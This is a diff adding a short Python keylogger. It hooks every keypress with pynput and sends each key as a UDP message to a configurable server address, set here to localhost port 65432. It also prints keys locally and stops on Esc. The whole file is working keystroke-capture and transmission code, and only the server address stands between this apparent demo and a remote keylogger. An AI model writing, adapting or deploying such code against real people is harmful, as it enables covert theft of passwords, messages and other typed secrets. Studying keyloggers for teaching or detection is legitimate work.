@@ -1,0 +1,40 @@
+from pynput import keyboard
+import socket
+server_ip='localhost'
+
+def send_message(msg):
+    # Create a UDP socket
+    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+    # Define the server address and port
+    server_address = (server_ip, 65432)  # Match the server's IP and port
+
+    try:
+        # Send the message
+        client_socket.sendto(msg.encode(), server_address)
+        
+        # Receive response from server
+        response, _ = client_socket.recvfrom(1024)
+        # print(f"Server response: {response.decode()}")
+
+    finally:
+        client_socket.close()
+
+def on_press(key):
+    try:
+        key_str = key.char  # Normal key
+    except AttributeError:
+        key_str = str(key)  # Special key (like Ctrl, Alt, etc.)
+    
+    print(f'Key {key_str} pressed.')
+    send_message(key_str)
+
+def on_release(key):
+    print(f'Key {key} released.')
+    if key == keyboard.Key.esc:
+        # Stop listener
+        return False
+
+# Start listening for keyboard events
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
